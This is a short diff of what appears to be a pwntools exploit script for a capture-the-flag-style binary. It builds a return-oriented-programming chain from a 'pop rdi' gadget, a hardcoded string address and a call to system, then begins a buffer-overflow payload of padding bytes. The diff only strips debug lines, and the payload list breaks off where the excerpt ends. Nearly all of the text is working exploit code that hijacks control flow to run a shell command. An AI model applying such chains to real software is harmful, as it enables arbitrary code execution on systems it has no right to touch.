@@ -14,18 +14,12 @@ elf = context.binary = ELF(executable)
 
 rop = ROP(elf)
 
-#rop.call(rop.find_gadget(['pop rdi', 'ret']))
 rop.raw(p64((rop.find_gadget(['pop rdi', 'ret']))[0]))
 rop.raw(p64(0x402107))
 rop.call(elf.symbols["system"])
 
 #####################################################
 # Create Payload
-
-execute_string = p64(0x402107)
-info("%#x Execute String Address", u64(execute_string))
-POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
-info("%#x POP RDI", u64(POP_RDI))
 
 payload = [
     b"A" * padding_length,
